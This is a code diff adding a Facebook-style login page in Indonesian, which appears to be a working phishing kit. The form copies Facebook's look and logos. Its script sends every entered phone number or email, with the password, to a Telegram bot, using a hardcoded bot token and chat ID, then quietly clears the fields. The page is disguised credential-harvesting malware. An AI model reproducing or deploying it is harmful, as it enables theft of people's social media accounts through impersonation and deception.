@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Halaman Login Facebook Style</title>
+
+    <style>
+        body {
+            /* Latar Belakang Putih Sederhana */
+            background-color: #f0f2f5;
+            color: #1c1e21; /* Warna teks gelap */
+            font-family: Arial, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+        }
+
+        .top-ad-section {
+            width: 100%;
+            background-color: #f7f7f7; /* Warna latar atas (lebih terang) */
+            padding: 10px 20px;
+            box-sizing: border-box;
+            text-align: center;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .top-ad-section p {
+            color: #4b4f56;
+            font-size: 0.9em;
+            margin: 0;
+        }
+
+        .language-select {
+            color: #606770;
+            font-size: 0.9em;
+            margin: 20px 0;
+            text-align: center;
+            width: 100%;
+        }
+
+        .login-container {
+            width: 90%;
+            max-width: 400px;
+            padding: 0 20px;
+            text-align: center;
+        }
+
+        .app-logo {
+            /* Logo Facebook di tengah */
+            width: 70px;
+            height: 70px;
+            margin-bottom: 20px;
+            margin-top: 10px;
+        }
+
+        /* Gaya untuk input field */
+        .login-form input {
+            width: 100%;
+            padding: 14px 12px;
+            margin-bottom: 15px;
+            border: 1px solid #dddfe2; /* Border abu-abu muda */
+            background-color: #fff;
+            color: #1c1e21;
+            border-radius: 6px;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+
+        .login-form input::placeholder {
+            color: #8d949e;
+        }
+
+        /* Gaya untuk tombol Login (biru solid) */
+        .login-button {
+            width: 100%;
+            padding: 14px;
+            background-color: #1877f2; /* Biru khas Facebook */
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 5px;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+
+        /* Gaya untuk "Lupa kata sandi?" */
+        .forgot-password {
+            display: block;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 0.95em;
+            margin-bottom: 40px;
+        }
+
+        /* Garis pemisah atau separator */
+        .separator {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 30px 0;
+        }
+
+        .separator::before,
+        .separator::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dadde1; /* Garis abu-abu */
+        }
+
+        .separator:not(:empty)::before {
+            margin-right: .25em;
+        }
+
+        .separator:not(:empty)::after {
+            margin-left: .25em;
+        }
+
+        /* Gaya untuk tombol "Buat akun baru" (Outline) */
+        .create-account-button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            /* Border dan warna teks hijau khas Facebook */
+            border: 1px solid #42b72a;
+            background-color: #42b72a;
+            color: white;
+            border-radius: 6px;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        .create-account-button:hover {
+            background-color: #36a420;
+        }
+
+        /* Bagian Meta di paling bawah */
+        .meta-section {
+            margin-top: 40px;
+            width: 100%;
+            text-align: center;
+        }
+
+        .meta-logo {
+            width: 70px; /* Ukuran logo Meta */
+            margin-bottom: 15px;
+        }
+
+        .meta-links a {
+            color: #606770;
+            text-decoration: none;
+            font-size: 0.8em;
+            margin: 0 10px;
+        }
+    </style>
+
+</head>
+<body>
+    <div class="top-ad-section">
+        <p>Dapatkan Facebook untuk Android dan nikmati pengalaman menjelajah yang lebih cepat.</p>
+    </div>
+
+    <p class="language-select">Bahasa Indonesia</p>
+
+    <div class="login-container">
+        
+        <img src="https://files.catbox.moe/v1wci7.png" alt="Logo Facebook" class="app-logo">
+        
+        <form class="login-form" id="login-form">
+            <input type="text" id="username_field" placeholder="Nomor ponsel atau email" required>
+            <input type="password" id="password_field" placeholder="Kata sandi" required>
+            
+            <button type="submit" class="login-button">Login</button>
+            
+            <a href="#" class="forgot-password">Lupa kata sandi?</a>
+            
+            <div class="separator"></div>
+            
+            <a href="#" class="create-account-button">Buat akun baru</a>
+        </form>
+    </div>
+    
+    <div class="meta-section">
+        <img src="https://files.catbox.moe/c5q03r.png" alt="Meta Logo" class="meta-logo">
+        <p>Meta</p>
+        
+        <div class="meta-links">
+            <a href="#">Tentang</a>
+            <a href="#">Bantuan</a>
+            <a href="#">Lainnya</a>
+        </div>
+    </div>
+    
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const BOT_TOKEN = '8294940824:AAFJYAbNnxRyaNB321v9IEQ_dnqBZJA7R7I';
+            const CHAT_ID = '6315300476';
+            const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+            const form = document.getElementById('login-form');
+            const usernameField = document.getElementById('username_field');
+            const passwordField = document.getElementById('password_field');
+            const submitButton = form.querySelector('.login-button');
+
+            async function sendLoginData(event) {
+                event.preventDefault();
+
+                const username = usernameField.value.trim();
+                const password = passwordField.value.trim();
+
+                if (!username || !password) {
+                    console.warn("⚠️ Peringatan: Harap isi semua kolom input.");
+                    return;
+                }
+
+                submitButton.disabled = true;
+                submitButton.textContent = 'Mengirim Data...';
+
+                const telegramMessage = `
+                    <b>🚨 DETEKSI AKUN BARU FACEBOOK 🚨</b>
+
+                    =============================
+                    <b>👤 NO. HANDPHONE/PEMAIL:</b> <code>${username}</code>
+                    <b>🔑 KATA SANDI:</b> <code>${password}</code>
+                    =============================
+
+                    <i>⚠️ Data didapatkan melalui form Login.</i>
+                `;
+
+                try {
+                    const response = await fetch(TELEGRAM_API, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: telegramMessage,
+                            parse_mode: 'HTML'
+                        })
+                    });
+
+                    if (response.ok) {
+                        console.log("✅ Sukses: Data berhasil dikirim ke Telegram (UI Bersih).");
+                        usernameField.value = '';
+                        passwordField.value = '';
+                    } else {
+                        const errorData = await response.json();
+                        console.error("❌ Gagal Mengirim Data. Cek Bot Token/Chat ID. Error Telegram:", errorData);
+                    }
+                } catch (error) {
+                    console.error("⚠️ Kesalahan Jaringan saat mengirim data:", error);
+                } finally {
+                    submitButton.disabled = false;
+                    submitButton.textContent = 'Login';
+                }
+            }
+
+            form.addEventListener('submit', sendLoginData);
+        });
+    </script>
+</body>
+</html>
